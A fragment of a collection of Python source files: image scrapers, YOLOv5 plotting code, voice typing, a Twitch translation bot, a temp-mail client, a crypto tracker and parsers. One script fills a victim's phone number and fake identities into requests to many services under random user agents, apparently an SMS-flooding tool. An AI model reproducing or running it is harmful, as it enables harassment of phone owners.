driver.current_url.split('/')[-2]\r\ntime.sleep(5)\r\n\r\nmain_div = driver.find_element(By.CSS_SELECTOR, 'div[class=\"x6s0dn4 x1dqoszc xu3j5b3 xm81vs4 x78zum5 x1iyjqo2 x1tjbqro\"]')\r\n\r\nimgs_link = []\r\n\r\nwhile True:\r\n    imgs = main_div.find_elements(By.CSS_SELECTOR, \"img[style='object-fit: cover;']\")\r\n    for img in imgs:\r\n        if img.get_attribute('src') not in imgs_link:\r\n            imgs_link.append(img.get_attribute('src'))\r\n    \r\n    try:\r\n        driver.find_element(By.CSS_SELECTOR, 'button[aria-label=\"Next\"]').click()\r\n        time.sleep(5)\r\n    except:\r\n        break\r\n\r\n\r\nnum = 1\r\ntime.sleep(3)\r\nfor link in imgs_link:\r\n    urllib.request.urlretrieve(link, f'img_{num}{shortcode}.jpg')\r\n    num += 1\r\n    time.sleep(6)\r\n\r\n",
    "# YOLOv5 \ud83d\ude80 by Ultralytics, AGPL-3.0 license\n\"\"\"Plotting utils.\"\"\"\n\nimport contextlib\nimport math\nimport os\nfrom copy import copy\nfrom pathlib import Path\n\nimport cv2\nimport matplotlib\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport pandas as pd\nimport seaborn as sn\nimport torch\nfrom PIL import Image, ImageDraw\nfrom scipy.ndimage.filters import gaussian_filter1d\nfrom ultralytics.utils.plotting import Annotator\n\nfrom utils import TryExcept, threaded\nfrom utils.general import LOGGER, clip_boxes, increment_path, xywh2xyxy, xyxy2xywh\nfrom utils.metrics import fitness\n\n# Settings\nRANK = int(os.getenv(\"RANK\", -1))\nmatplotlib.rc(\"font\", **{\"size\": 11})\nmatplotlib.use(\"Agg\")  # for writing to files only\n\n\nclass Colors:\n    # Ultralytics color palette https://ultralytics.com/\n    def __init__(self):\n        \"\"\"\n        Initializes the Colors class with a palette derived from Ultralytics color scheme, converting hex codes to RGB.\n\n        Colors derived from `hex = matplotlib.colors.TABLEAU_COLORS.values()`.\n        \"\"\"\n        hexs = (\n            \"FF3838\",\n            \"FF9D97\",\n            \"FF701F\",\n            \"FFB21D\",\n            \"CFD231\",\n            \"48F90A\",\n            \"92CC17\",\n            \"3DDB86\",\n            \"1A9334\",\n            \"00D4BB\",\n            \"2C99A8\",\n            \"00C2FF\",\n            \"344593\",\n            \"6473FF\",\n            \"0018EC\",\n            \"8438FF\",\n            \"520085\",\n            \"CB38FF\",\n            \"FF95C8\",\n            \"FF37C7\",\n        )\n        self.palette = [self.hex2rgb(f\"#{c}\") for c in hexs]\n        self.n = len(self.palette)\n\n    def __call__(self, i, bgr=False):\n        \"\"\"Returns color from palette by index `i`, in BGR format if `bgr=True`, else RGB; `i` is an integer index.\"\"\"\n        c = self.palette[int(i) % self.n]\n        return (c[2], c[1], c[0]) if bgr else c\n\n    @staticmethod\n    def hex2rgb(h):\n        \"\"\"Converts hexadecimal color `h` to an RGB tuple (PIL-compatible) with order (R, G, B).\"\"\"\n        return tuple(int(h[1 + i : 1 + i + 2], 16) for i in (0, 2, 4))\n\n\ncolors = Colors()  # create instance for 'from utils.plots import colors'\n\n\ndef feature_visualization(x, module_type, stage, n=32, save_dir=Path(\"runs/detect/exp\")):\n    \"\"\"\n    x:              Features to be visualized\n    module_type:    Module type\n    stage:          Module stage within model\n    n:              Maximum number of feature maps to plot\n    save_dir:       Directory to save results\n    \"\"\"\n    if (\"Detect\" not in module_type) and (\n        \"Segment\" not in module_type\n    ):  # 'Detect' for Object Detect task,'Segment' for Segment task\n        batch, channels, height, width = x.shape  # batch, channels, height, width\n        if height > 1 and width > 1:\n            f = save_dir / f\"stage{stage}_{module_type.split('.')[-1]}_features.png\"  # filename\n\n            blocks = torch.chunk(x[0].cpu(), channels, dim=0)  # select batch index 0, block by channels\n            n = min(n, channels)  # number of plots\n            fig, ax = plt.subplots(math.ceil(n / 8), 8, tight_layout=True)  # 8 rows x n/8 cols\n            ax = ax.ravel()\n            plt.subplots_adjust(wspace=0.05, hspace=0.05)\n            for i in range(n):\n                ax[i].imshow(blocks[i].squeeze())  # cmap='gray'\n                ax[i].axis(\"off\")\n\n            LOGGER.info(f\"Saving {f}... ({n}/{channels})\")\n            plt.savefig(f, dpi=300, bbox_inches=\"tight\")\n            plt.close()\n            np.save(str(f.with_suffix(\".npy\")), x[0].cpu().numpy())  # npy save\n\n\ndef hist2d(x, y, n=100):\n    \"\"\"\n    Generates a logarithmic 2D histogram, useful for visualizing label or evolution distributions.\n\n    Used in used in labels.png and evolve.png.\n    \"\"\"\n    xedges, yedges = np.linspace(x.min(), x.max(), n), np.linspace(y.min(), y.max(), n)\n    hist, xedges, yedges = np.histogram2d(x, y, (xedges, yedges))\n    xidx = np.clip(np.digitize(x, xedges) - 1, 0, hist.shape[0] - 1)\n    yidx = np.clip(np.digitize(y, yedges) - 1, 0, hist.shape[1] - 1)\n    return np.log(hist[xidx, yidx])\n\n\ndef butter_lowpass_filtfilt(data, cutoff=1500, fs=50000, order=5):\n    \"\"\"Applies a low-pass Butterworth filter to `data` with specified `cutoff`, `fs`, and `order`.\"\"\"\n    from scipy.signal import butter, filtfilt\n\n    # https://stackoverflow.com/questions/28536191/how-to-filter-smooth-with-scipy-numpy\n    def butter_lowpass(cutoff, fs, order):\n        nyq = 0.5 * fs\n        normal_cutoff = cutoff / nyq\n        return butter(order, normal_cutoff, btype=\"low\", analog=False)\n\n    b, a = butter_lowpass(cutoff, fs, order=order)\n    return filtfilt(b, a, data)  # forward-backward filter\n\n\ndef output_to_target(output, max_det=300):\n    \"\"\"Converts YOLOv5 model output to [batch_id, class_id, x, y, w, h, conf] format for plotting, limiting detections\n    to `max_det`.\n    \"\"\"\n    targets = []\n    for i, o in enumerate(output):\n        box, conf, cls = o[:max_det, :6].cpu().split((4, 1, 1), 1)\n        j = torch.full((conf.shape[0], 1), i)\n        t",
    "import os\nimport torch\nimport queue\nimport numpy as np\nimport speech_recognition as sr\nimport pynput.keyboard\nfrom faster_whisper import WhisperModel\n\nkeyboard = pynput.keyboard.Controller()\n\nmodel_root = os.path.expanduser(\"~/.cache/whisper\")\naudio_model = WhisperModel(\"distil-small.en\", download_root=model_root, device=\"auto\", compute_type=\"int8\")\n\naudio_queue = queue.Queue()\n\nrecorder = sr.Recognizer()\nrecorder.energy_threshold = 300\nrecorder.dynamic_energy_threshold = False\nhallucinate_threshold = 40\n\nsource = sr.Microphone(sample_rate=16000)\nwith source: recorder.adjust_for_ambient_noise(source)\n\ndef record_queue_pop():\n    audio = b\"\".join([audio_queue.get() for _ in range(audio_queue.qsize())])\n    return sr.AudioData(audio,16000,2).get_raw_data()\n\ndef record_queue_push(_, audio):\n    audio_queue.put_nowait(audio.get_raw_data())\nrecorder.pause_threshold = 5\nrecorder.listen_in_background(source, record_queue_push, phrase_time_limit=5)\n\n\nwhile True:\n    audio_frame = np.frombuffer(record_queue_pop(), dtype=np.int16)\n\n    loudness = np.sqrt(np.mean(np.square(audio_frame)))\n    if loudness < hallucinate_threshold:\n        continue\n\n    to_write = ''\n    audio_data = audio_frame.flatten().astype(np.float32) / 32768.0\n    segments, _ = audio_model.transcribe(audio_data)\n    to_write = ''.join([segment.text for segment in segments])\n\n    if to_write: keyboard.type(to_write) # [\" \",\"\\n\"]:",
    "import os\nimport json\nimport csv\nimport re\nfrom twitchio.ext import commands\nfrom twitchio.ext import routines\nimport deepl \n\nCLIENT_ID = ''\nCLIENT_SECRET = ''\nACCESS_TOKEN = ''\nREFRESH_TOKEN = ''\nAUTH_KEY = ''\nSOURCE_LANGUAGE = ''\nTARGET_LANGUAGE = ''\nCHANNEL_URL = ''\n\nclass Bot(commands.Bot):\n    def __init__(self):\n        super().__init__(token=ACCESS_TOKEN, prefix='!', initial_channels=[CHANNEL_URL])\n\n    async def event_ready(self):\n        # Bot says 'None' first, when no routine is set\n        print(f'Logged in as | {self.nick}')\n        print('Bot is ready!')\n        await self.get_channel(CHANNEL_URL).send('Translation-Bot is ready! SeriousSloth')\n    \n    async def event_message(self, message):\n        if message.echo:\n            return\n        await self.handle_commands(message)\n        if message.content[:3] == '!ja':\n            return\n        translation_result = translate(message.content, SOURCE_LANGUAGE, TARGET_LANGUAGE)        \n        if translation_result:\n            await message.channel.send(f'{message.author.name}: {translation_result}')\n        \n    async def event_command_error(self, context: commands.Context, error: Exception):\n        if isinstance(error, commands.CommandNotFound):\n            return\n        print(error)\n\n    @commands.command()\n    async def ja(self, ctx: commands.Context, *, phrase: str):\n        translation_result = translate(phrase, TARGET_LANGUAGE, SOURCE_LANGUAGE)\n        if translation_result:\n            await ctx.send(f'{ctx.author.name}: {translation_result}')\n\n    @routines.routine(seconds=900.0)\n    async def check_access_token():\n        if not is_access_token_valid():    \n            refresh_access_token()\n    check_access_token.start()\n\ndef read_credentials():\n    with open('config.csv') as f:\n        csv_reader = csv.reader(f, delimiter=',')\n        for i, row in enumerate(csv_reader):\n            if i == 1:\n                globals()['CLIENT_ID'] = row[0]\n                globals()['CLIENT_SECRET'] = row[1]\n                globals()['ACCESS_TOKEN'] = row[2]\n                globals()['REFRESH_TOKEN'] = row[3]\n                globals()['AUTH_KEY'] = row[4]\n                globals()['SOURCE_LANGUAGE'] = row[5]\n                globals()['TARGET_LANGUAGE'] = row[6]\n                globals()['CHANNEL_URL'] = row[7]\n    print('CSV-File successfully found.')\n\ndef write_credentials():\n    with open('config.csv', 'w', newline='') as f:\n        writer = csv.writer(f)\n        writer.writerow(['CLIENT_ID', 'CLIENT_SECRET', 'ACCESS_TOKEN', 'REFRESH_TOKEN', 'AUTH_KEY', 'SOURCE_LANGUAGE', 'TARGET_LANGUAGE', 'CHANNEL_URL'])\n        writer.writerow([CLIENT_ID, CLIENT_SECRET, ACCESS_TOKEN, REFRESH_TOKEN, AUTH_KEY, SOURCE_LANGUAGE, TARGET_LANGUAGE, CHANNEL_URL])\n    print('Successfully refreshed credentials.')\n\ndef is_access_token_valid():\n    validation_result = os.popen(f\"curl -X GET \\\"https://id.twitch.tv/oauth2/validate\\\" -H \\\"Authorization: OAuth {ACCESS_TOKEN}\\\"\").read()\n    parsed_validation_result = json.loads(validation_result)\n    if 'expires_in' in parsed_validation_result:\n        if parsed_validation_result['expires_in'] > 2400:\n            return True\n        else:\n            return False\n    print('Access Token Validation check failed.')\n\ndef refresh_access_token():    \n    refresh_request_result = os.popen(f\"curl -X POST \\\"https://id.twitch.tv/oauth2/token\\\" -H \\\"Content-Type: application/x-www-form-urlencoded\\\" -d \\\"grant_type=refresh_token&refresh_token={REFRESH_TOKEN}&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}\\\"\").read()\n    parsed_refresh_request_result = json.loads(refresh_request_result)\n    if 'access_token' in parsed_refresh_request_result:        \n        globals()['ACCESS_TOKEN'] = parsed_refresh_request_result['access_token']\n        globals()['REFRESH_TOKEN'] = parsed_refresh_request_result['refresh_token']\n    else:\n        print('Couldn\\'t refresh Access Token. Check Refresh Token.')\n    write_credentials()\n\ndef translate(source_text, source_l, target_l):\n    if source_l == 'JA':\n        source_text_cleaned = re.sub(r'[^\\u3000-\\u303f\\u3040-\\u309f\\u30a0-\\u30ff\\uff00-\\uff9f\\u4e00-\\u9faf\\u3400-\\u4dbf]', '', source_text)\n    elif TRANSLATOR.translate_text(source_text, target_lang='EN-US').detected_source_lang == 'EN':        \n        source_l = 'EN' # DeepL-API recognizes only EN as source-value, no EN-US or EN-GB\n        source_text_cleaned = source_text\n    else:\n        return ''\n    if source_text_cleaned:        \n        result = TRANSLATOR.translate_text(source_text, source_lang=source_l, target_lang=target_l)\n        return result.text\n\nread_credentials()\nif not is_access_token_valid():    \n    refresh_access_token()\nTRANSLATOR = deepl.Translator(AUTH_KEY)\nbot = Bot()\nbot.run()\n",
    "import argparse\nimport json\nimport jsoneditor\nimport logging\nimport random\nimport re\nimport requests\nimport string\nfrom dataclasses import dataclass\nfrom fake_useragent import UserAgent\nfrom pprint import pprint\n\nua = UserAgent()\n\nlogging.basicConfig(\n    level=logging.DEBUG,\n    format='%(levelname)s: %(message)s'\n)\n\nphone_pattern_legacy = re.compile(r'\\{formatted_phone:(.*)}')\nphone_pattern = re.compile(r'\\{phone:([^}]*)}')\n\n\n@dataclass\nclass Phone:\n    country_code: str\n    phone: str\n\n    def __str__(self):\n        return self.country_code + self.phone\n\n\n@dataclass\nclass FakeData:\n    first_name: str\n    last_name: str\n    password: str\n    email: str\n    username: str\n\n\ndef generate_fake_data():\n    first_name = random.choice([\"\u041c\u0430\u0440\u0438\u044f\", \"\u0410\u043d\u043d\u0430\", \"\u0415\u043a\u0430\u0442\u0435\u0440\u0438\u043d\u0430\", \"\u0421\u0432\u0435\u0442\u043b\u0430\u043d\u0430\", \"\u0418\u0440\u0438\u043d\u0430\", \"\u041e\u043b\u044c\u0433\u0430\"])\n    last_name = random.choice([\"\u0418\u0432\u0430\u043d\u043e\u0432\u0430\", \"\u041f\u0435\u0442\u0440\u043e\u0432\u0430\", \"\u0421\u043c\u0438\u0440\u043d\u043e\u0432\u0430\", \"\u041a\u0443\u0437\u043d\u0435\u0446\u043e\u0432\u0430\", \"\u0421\u043e\u043a\u043e\u043b\u043e\u0432\u0430\", \"\u041f\u043e\u043f\u043e\u0432\u0430\"])\n    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))\n    email = f\"{first_name.lower()}.{last_name.lower()}@{random.choice(['mail.ru', 'yandex.ru', 'gmail.com'])}\"\n    username = first_name.lower() + str(random.randint(100, 999))\n    return FakeData(first_name, last_name, password, email, username)\n\n\nfake_data = generate_fake_data()\n\nlogging.debug(\"Fake data: %s\", fake_data)\n\n\ndef format_phone(phone, mask):\n    formatted_phone = []\n    phone_index = 0\n    for symbol in mask:\n        if phone_index < len(phone):\n            if symbol == '*':\n                formatted_phone.append(phone[phone_index])\n                phone_index += 1\n            else:\n                formatted_phone.append(symbol)\n    return ''.join(formatted_phone)\n\n\ndef format_by_pattern(input_string, phone):\n    new_string = input_string\n\n    match_legacy = phone_pattern_legacy.search(input_string)\n    if match_legacy:\n        new_string = new_string.replace(\n            match_legacy.group(),\n            format_phone(str(phone), match_legacy.group(1))\n        )\n\n    match = phone_pattern.search(input_string)\n    if match:\n        new_string = new_string.replace(\n            match.group(),\n            format_phone(phone.phone, match.group(1))\n        )\n\n    replacements = {\n        \"full_phone\": str(phone),\n        \"phone\": phone.phone,\n        \"first_name\": fake_data.first_name,\n        \"last_name\": fake_data.last_name,\n        \"password\": fake_data.password,\n        \"email\": fake_data.email,\n        \"username\": fake_data.username\n    }\n\n    for key, value in replacements.items():\n        new_string = new_string.replace(\"{\" + key + \"}\", str(value))\n\n    return new_string\n\n\ndef process_request(request, phone):\n    url = format_by_pattern(request[\"url\"], phone)\n    logging.info(\"URL: %s\", url)\n\n    method = request.get(\"method\", \"POST\").upper()\n    logging.info(\"Method: %s\", method)\n\n    params = {\n        \"url\": url,\n        \"method\": method,\n        \"headers\": {\"User-Agent\": ua.random}\n    }\n\n    if \"headers\" in request:\n        for k, v in request[\"headers\"].items():\n            formatted_key = format_by_pattern(k, phone)\n            formatted_value = format_by_pattern(v, phone)\n            params[\"headers\"][formatted_key] = formatted_value\n\n        logging.info(\"Headers: %s\", params[\"headers\"])\n\n    if \"json\" in request:\n        json_body = format_by_pattern(\n            json.dumps(request[\"json\"]) if isinstance(request[\"json\"], dict) else request[\"json\"], phone)\n\n        try:\n            json.loads(json_body)\n        except Exception as e:\n            logging.warning(\"INVALID JSON BODY: %s, Error: %s\", json_body, str(e))\n\n        logging.debug(\"JSON Body: %s\", json_body)\n\n        params[\"json\"] = json.loads(json_body)\n\n    if \"params\" in request:\n        url_params = {\n            k: format_by_pattern(v, phone)\n            for k, v in request[\"params\"].items()\n        }\n\n        logging.debug(\"Params: %s\", url_params)\n\n        params[\"params\"] = url_params\n\n    if \"data\" in request:\n        form_data = {\n            format_by_pattern(k, phone): format_by_pattern(v, phone)\n            for k, v in request[\"data\"].items()\n        }\n\n        logging.debug(\"Form data Body: %s\", form_data)\n\n        params[\"data\"] = form_data\n\n    logging.debug(\"Sending request with params: %s\", params)\n\n    try:\n        response = requests.request(**params)\n        try:\n            pprint(response.json())\n        except json.JSONDecodeError:\n            print(response.text)\n    except requests.RequestException as e:\n        logging.error(\"Request failed: %s\", str(e))\n\n\ndef process_service(service, phone):\n    if \"requests\" in service:\n        for index, request in enumerate(service[\"requests\"]):\n            logging.info(\"Request #%s\", index)\n            process_request(request, phone)\n    else:\n        process_request(service, phone)\n\n\ndef process_services(services, phone):\n    if isinstance(services, list):\n        for index, service in enumerate(services):\n            logging.info(\"Service #%s\", index)\n            process_service(service, phon",
    "\"\"\"\nDescription: \nAuthor: Nicolas Gaudin\nDate Created: March 19, 2024\nDate Modified: April 02, 2024\nVersion: 1.0\nPython Version: 3.10.12\nDependencies: time, sys\nLicense: MIT License\n\"\"\"\n\n\n#utilization\n# 2 vcd files with same signals\n# it compares consequently traces of aimed signals\n# signals to be compared are declared in the variable \"signals\"\n# if you want to analyze a signal from a bloc that is declared multiples times, only the first declared will be analyzed\n# cannot compare 1-bit signal\n\n\nimport time, sys\n\nstart_time = time.time_ns()\n\nold_stdout = sys.stdout\nlog_file = open(\"message.log\",\"w\")\nsys.stdout = log_file\n\n\ndef searchOccurence(file, signal) -> int:\n    F = []\n    vcdtime = 0\n    invcd1 = 'ffffffffffffffffff' #impossible value \n\n    is_in = 1\n    header = 1\n\n    # printTab(file)\n    with open(file, 'r') as fvcd:\n        for vcd in fvcd:\n            # retrieve trigger start and stop\n            if header == 0:\n                if vcd.find('#',0,1) != -1:\n                    vcdtime = vcd.replace(\"#\",'')\n                    vcdtime = vcdtime.replace(\"\\n\",'')\n                if ((vcd.find(invcd1) != -1) and (vcd.find('b',0,1) != -1)):\n                    listt = []\n                    listt.append(vcdtime)\n                    listt.append(vcd.replace(invcd1,'').replace(\" \\n\",''))\n                    F.append(listt)\n            if vcd.find('#0',0,2) != -1:\n                # print(Fore.RED + \"debug\")\n                # print(Style.RESET_ALL)\n                header = 0\n            if(is_in == 1) :\n                if vcd.find(signal) != -1:\n                    # print(vcd)\n                    test = vcd.split(' ')\n                    test = list(filter(None, test))\n                    # print(test)\n                    if (len(test) >= 5 ):\n                        if((test[4] == signal) and (len(signal) == len(test[4]))):\n                            invcd1 = test[3]\n                            is_in = 0\n                            # printTab(invcd1)\n    return F\n\ndef searchDiff(f1, f2, signals) -> int:\n\n    for signal in signals:\n        F1 = searchOccurence(f1, signal)\n        F2 = searchOccurence(f2, signal)\n        # print(F1)\n        # print(F2)\n\n        # print(len(F1))\n        # print(len(F2))\n\n        i = 0 \n        for val1,val2 in zip(F1,F2):\n            if((val1[1] != val2[1]) and i<10000) :\n                if(i==0):\n                    print(signal)\n                    printTab(len(F1))\n                    printTab(len(F2))\n                time1=val1[0]\n                time2=val2[0]\n                bin1 = val1[1].replace('b','')\n                # print(str(hex(int(bin1,2))))\n                bin2 = val2[1].replace('b','')\n                print(str(F1.index(val1)+1)+\"\\t@\"+time1+\" : 0x\"+str(format(int(bin1,2), '08x'))+\" != @\"+time2+\" : 0x\"+str(format(int(bin2,2), '08x')))\n                i+=1\n        if(i !=0):\n            print(\"\\n\")\n    return\n\ndef printTab(*args):\n    args = (\"\\t\",)+args\n    print(*args)\n\n# signals = [\"sp\"]\nsignals = [\"ra\",\"sp\",\"gp\",\"tp\",\"t0\",\"t1\",\"t2\",\"s0\",\"s1\",\"a0\",\"a1\",\"a2\",\"a3\",\"a4\",\"a5\",\"a6\",\"a7\",\"s2\",\"s3\",\"s4\",\"s5\",\"s6\",\"s7\",\"s8\",\"s9\",\"s10\",\"s11\",\"t3\",\"t4\",\"t5\",\"t6\"]\n\nvcdF1 = \"good.vcd\"\nvcdF2 = \"bad.vcd\"\n\nsearchDiff(vcdF1, vcdF2, signals)\n\nsys.stdout = old_stdout\nlog_file.close()\n\n\nend_time = ((time.time_ns() - start_time)) / 1000000\nprint(\"--- %s ms ---\" % end_time)\n\n",
    "import requests\r\n\r\nclass Internxt:\r\n    def __init__(self):\r\n        self.session = requests.session()\r\n        self.session.headers = {\r\n            'Accept': 'application/json, text/plain, */*',\r\n            'Accept-Language': 'tr-TR,tr;q=0.9',\r\n            'Cache-Control': 'no-cache',\r\n            'Connection': 'keep-alive',\r\n            'Pragma': 'no-cache',\r\n            'Referer': 'https://internxt.com/temporary-email',\r\n            'Sec-Fetch-Dest': 'empty',\r\n            'Sec-Fetch-Mode': 'cors',\r\n            'Sec-Fetch-Site': 'same-origin',\r\n            'Sec-GPC': '1',\r\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',\r\n            'sec-ch-ua': '\"Brave\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"',\r\n            'sec-ch-ua-mobile': '?0',\r\n            'sec-ch-ua-platform': '\"Windows\"',\r\n        }\r\n\r\n    def get_new_mail(self):\r\n        response = self.session.get('https://internxt.com/api/temp-mail/create-email')\r\n        return response.json()[\"address\"], response.json()[\"token\"]\r\n    def get_inbox(self, mail_token):\r\n        params = {\r\n            'token': mail_token,\r\n        }\r\n\r\n        response = self.session.get('https://internxt.com/api/temp-mail/get-inbox', params=params)\r\n        return response.json()[\"emails\"]\r\n\r\n\r\n",
    "from web3 import *\r\ndef main():\r\n    import time,os,sys\r\n    import requests,json\r\n    from class_track import Base\r\n\r\n    processor = Base()\r\n    DONE = processor.hash_fetcher()\r\n    offchain = 0\r\n    while True:\r\n        print('Monitoring Influencers transaction')\r\n        ANSEM_INPUT,ROOKIE_INPUT = processor.monitor_transaction()\r\n        if bool(ANSEM_INPUT) or bool(ROOKIE_INPUT):\r\n            \r\n        \r\n            for input_data in ANSEM_INPUT:\r\n                try:\r\n                    amount_in,amount_out,swap_in_token,swap_out_token = processor.Input_Decoder(input_data)\r\n                    name = 'ANSEM'\r\n                    print(f'From Ansem {swap_out_token}')\r\n                    offchain = 0\r\n                    processor.Alert(name,swap_out_token,amount_out)\r\n                except Exception as e:\r\n                    pass\r\n                    #print(f'The issue is from ANSEM is {e}')\r\n            for input_data in ROOKIE_INPUT:\r\n                try:\r\n                    amount_in,amount_out,swap_in_token,swap_out_token = processor.Input_Decoder(input_data)\r\n                    name = 'ROOKIE'\r\n                    print(f'From rookie {swap_out_token}')\r\n                    offchain = 0\r\n                    processor.Alert(name,swap_out_token,amount_out)\r\n                except Exception as e:\r\n                    pass\r\n                    #print(f'The issue from Rookie is {e} ')\r\n        else:\r\n            offchain += 1\r\n            if offchain == 500:\r\n                offchain = 0\r\n                processor.off_chain()\r\n        time.sleep(5)\r\n        \r\n \r\nif __name__ == \"__main__\":\r\n    No_error = True\r\n    while No_error:\r\n        try:\r\n            main()\r\n        except Exception as e:\r\n            print(f'The whole Program Crashed Because Of {e}')\r\n            continue\r\n            \r\n           \r\n\r\n\r\n\r\n\r\n",
    "#!/usr/bin/env python3\n\n\"\"\"\nAsk the AI model to generate the command line interface for the given question.\n\"\"\"\n\nimport sys\nimport json\nimport termios\nimport tty\nfrom urllib import request\n\n\nDEFAULT_MODEL_NAME = \"llama2:latest\"\nDEFAULT_OLLAMA_SERVER = \"http://localhost:11434\"\n\ndef query_ollama(question, ollama_server, model_name):\n    \"\"\"Query the Ollama server to get the response for the given question.\n\n    Using streaming API to get the response in chunks.\n\n    Args:\n        question (str): The question to ask the AI model.\n        ollama_server (str): The Ollama server URL, e.g. http://localhost:11434.\n        model_name (str): The model name to use.\n    \"\"\"\n\n    ollama_request_url = f\"{ollama_server}/api/generate\"\n    data = {\n        \"model\": model_name,\n        \"prompt\": (\"Help me to generate the command line interface \"\n                   f\" for linux shell to do the following: {question}\"),\n        \"stream\": True\n    }\n    headers = {\n        \"Content-Type\": \"application/json\"\n    }\n    req = request.Request(ollama_request_url,\n                          data=json.dumps(data).encode(\"utf-8\"),\n                          headers=headers)\n    with request.urlopen(req) as resp:\n        for line in resp:\n            data = json.loads(line.decode('utf-8'))\n            if data['done']:\n                break\n            yield data['response']\n\ndef wait_for_exit(exit_value=0, prompt=\"\\n\\nPress Q/q to quit!\", quit_key='q'):\n    \"\"\"Wait for the user to press the quit key to exit the program.\n\n    Need to set the terminal to raw mode to read the key press.\n\n    Args:\n        exit_value (int): The exit value to use when exiting the program.\n        prompt (str): The prompt message to display.\n        quit_key (str): The key to press to exit the program.\n    \"\"\"\n\n    print(prompt, end=\"\")\n    fd = sys.stdin.fileno()\n    old_settings = termios.tcgetattr(fd)\n    try:\n        tty.setraw(fd)\n        while True:\n            read_char_count = 1\n            char = sys.stdin.read(read_char_count)\n            if char.lower() == quit_key.lower():\n                break\n    finally:\n        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)\n    sys.exit(exit_value)\n\ndef ask_ai(question, ollama_server=DEFAULT_OLLAMA_SERVER, model_name=DEFAULT_MODEL_NAME):\n    \"\"\"\n    Ask the AI model to generate the command line interface for the given question.\n\n    Args:\n        question (str): The question to ask the AI model.\n        ollama_server (str): The Ollama server URL.\n        model_name (str): The model name to use.\n    \"\"\"\n    for answer in query_ollama(question, ollama_server, model_name):\n        print(answer, end='', flush=True)\n\ndef main():\n    \"\"\"\n    Main function.\n    \"\"\"\n\n    if len(sys.argv) < 4:\n        print(f\"Usage: {sys.argv[0]} <ollama_url> <model_name> <question>\")\n        wait_for_exit(exit_value=1)\n\n    ollama_server_url = sys.argv[1]\n    model_name = sys.argv[2]\n    question = ' '.join(sys.argv[3:])\n    ask_ai(question, ollama_server_url, model_name)\n    wait_for_exit(exit_value=0)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import requests\nimport json\nfrom dataclasses import dataclass\nfrom typing import List\nimport time \nimport os\nfrom bytewax.connectors.stdio import StdOutSink\nfrom bytewax.dataflow import Dataflow\nfrom bytewax.inputs import FixedPartitionedSource, StatefulSourcePartition\nfrom bytewax import operators as op\nfrom bytewax.testing import run_main\n\nfrom dotenv import load_dotenv\nload_dotenv(\"./source.env\")\napi_key = os.getenv(\"api_key\")\ncache = {}\n\ndef fetch_job_listings(geo_code):\n    \"\"\"Generator to fetch job listings synchronously.\"\"\"\n    url = \"https://jsearch.p.rapidapi.com/search\"\n\n    querystring = {\"query\":geo_code,\"page\":\"1\",\"num_pages\":\"1\"}\n\n    headers = {\n        \"X-RapidAPI-Key\": api_key,\n        \"X-RapidAPI-Host\": \"jsearch.p.rapidapi.com\"\n    }\n\n    cache_key = f\"{geo_code}\"\n    if cache_key in cache:\n        # Return cached data if available\n        for job in cache[cache_key]:\n            yield job\n    else:\n        # Fetch and cache data if not available\n        fetched_data = []\n        try:\n            response = requests.get(url, headers=headers, params=querystring, timeout=10)\n            data = response.json()\n            if data[\"status\"] == \"OK\":\n                for job in data[\"data\"]:\n                    fetched_data.append(job)\n                    yield job\n                cache[cache_key] = fetched_data  # Cache the fetched data\n            else:\n                print(f\"API error: {data.get('error', 'Unknown error')}\")\n            time.sleep(35)  # Delay to respect rate limits\n        except requests.exceptions.Timeout:\n            print(\"Request timed out\")\n        except requests.exceptions.RequestException as e:\n            print(f\"Request failed: {e}\")\n\n\nclass LinkedInPartition(StatefulSourcePartition):\n    \"\"\"Custom partition for LinkedIn job listings.\"\"\"\n    def __init__(self, geo_id):\n        self.geo_id = geo_id\n\n    def next_batch(self):\n        return list(fetch_job_listings(self.geo_id))  # Fetch and return job listings as a list\n\n    def snapshot(self):\n        return None\n\n@dataclass\nclass LinkedInSource(FixedPartitionedSource):\n    \"\"\"Source class to manage multiple partitions for fetching LinkedIn job listings.\"\"\"\n    geo_codes: List[str]\n\n    def list_parts(self) -> List[str]:\n        return self.geo_codes\n\n    def build_part(self, step_id, for_key, _resume_state) -> LinkedInPartition:\n        return LinkedInPartition(for_key)\n\n# Initialize the Dataflow\nflow = Dataflow(\"linkedin_jobs\")\ninp = op.input(\n    \"input\", flow, LinkedInSource([\"AI Engineer\"])  \n)\nop.inspect(\"inspect\", inp)\nrun_main(flow)\n",
    "from collections import defaultdict\nfrom dfa import DFA, State as DFAState\nimport re\n\n\ntest_input = \"\"\"stateDiagram-v2\n\n[*] --> Q0\nQ0 --> Q1: 0\nQ1 --> Q1: 0\nQ1 --> Q2: 1\nQ2 --> Q1: 0\nQ2 --> Q2: 1\n\nQ0 --> Q3: 1\nQ3 --> Q3: 1\nQ3 --> Q4: 0\nQ4 --> Q3: 1\nQ4 --> Q4: 0\n\nQ2 --> [*]\nQ4 --> [*]\"\"\"\n\n# parse mermaid to generate DFA\nedge_regex = re.compile(r\"^#?(\\w+?|\\[\\*\\])\\s*-->\\s*(\\w+?|\\[\\*\\])(?::\\s*(.+))?$\", re.MULTILINE)\n# group1: source state; group2: dest state; group3: transition symbol\ndef parse_mermaid(mermaid: str) -> DFA:\n    # judge if one state has multiple transitions with the same symbol to judge DFA/NFA\n    matches = edge_regex.findall(mermaid)\n    state_map: dict[str, dict[str, list[str]]] = defaultdict(dict)\n    start_states = []\n    final_states = []\n    all_states = set()\n    alphabet = set()\n    \n    def add_transition(src: str, dest: str, trans: str):\n        alphabet.add(trans)\n        all_states.add(src)\n        all_states.add(dest)\n        if trans not in state_map[src]:\n            state_map[src][trans] = []\n        state_map[src][trans].append(dest) # support NFA\n\n    for match in matches:\n        # notice that [*] is used to indicate start/final state, with no transitions\n        src = match[0]\n        dest = match[1]\n        trans = match[2]  # might be \"\"\n        if src == \"[*]\":\n            start_states.append(dest)\n        elif dest == \"[*]\":\n            final_states.append(src)\n        else:\n            # ignore space and split by comma\n            splitted = trans.replace(\" \", \"\").split(\",\")  # support multiple transitions in one line\n            for x in splitted:\n                add_transition(src, dest, x)\n                \n    is_nfa = False\n    for src, 